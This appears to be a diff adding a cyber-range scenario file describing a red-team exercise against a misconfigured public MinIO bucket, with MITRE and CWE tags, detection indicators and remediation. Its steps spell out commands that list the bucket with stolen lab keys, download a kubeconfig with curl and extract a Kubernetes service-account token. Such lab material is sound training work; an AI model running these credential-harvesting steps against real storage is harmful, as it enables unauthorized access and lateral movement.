@@ -1,0 +1,45 @@
+id: red_02_cld-storage_public_bucket
+name: "Misconfigured Public S3/MinIO Bucket — Kubeconfig Exfiltration"
+range: RNG-CLD-01
+machine: M2-cld-storage
+mitre:
+  - technique: T1530
+    name: "Data from Cloud Storage Object"
+cwe:
+  - CWE-732  # Incorrect Permission Assignment for Critical Resource
+cvss: "9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)"
+description: |
+  The MinIO object storage bucket pul-cloud-backups is configured with a public
+  anonymous read+list policy, making all objects accessible without authentication.
+  The bucket contains k8s/cloud-ci-kubeconfig.yaml with a static Kubernetes
+  service account token, enabling API server authentication on M3.
+entry_condition: "AccessKeyId: AKIAPUL2024CLDSVC01 (from M1 IMDS) or anonymous (public bucket)"
+prereqs:
+  - Network access to 11.0.2.20:9000
+  - Stolen MinIO credentials (or no credentials needed for public path)
+steps:
+  - id: 1
+    name: "List buckets with stolen credentials"
+    cmd: "AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01 AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!' aws s3 ls --endpoint-url http://11.0.2.20:9000"
+  - id: 2
+    name: "List public bucket contents (no auth needed)"
+    cmd: "curl -s 'http://11.0.2.20:9000/pul-cloud-backups?list-type=2'"
+  - id: 3
+    name: "Download kubeconfig"
+    cmd: "curl -o cloud-ci-kubeconfig.yaml http://11.0.2.20:9000/pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml"
+  - id: 4
+    name: "Extract K8s token"
+    cmd: "grep 'token:' cloud-ci-kubeconfig.yaml"
+output:
+  credential: "K8s SA token: pul-cloud-ci-runner-token-2024gridfall"
+  next_target: "M3 K3s API (11.0.2.30:6443)"
+artifacts:
+  - "journalctl -u pul-minio"
+  - "MinIO bucket policy (mc anonymous get)"
+detection_indicators:
+  - "Anonymous download of k8s/cloud-ci-kubeconfig.yaml"
+  - "No Authorization header on object GET from external IP"
+remediation:
+  - "Set bucket policy to private: mc anonymous set none"
+  - "Never store kubeconfigs or tokens in object storage"
+  - "Enable bucket access logging with SIEM alert on kubeconfig downloads"
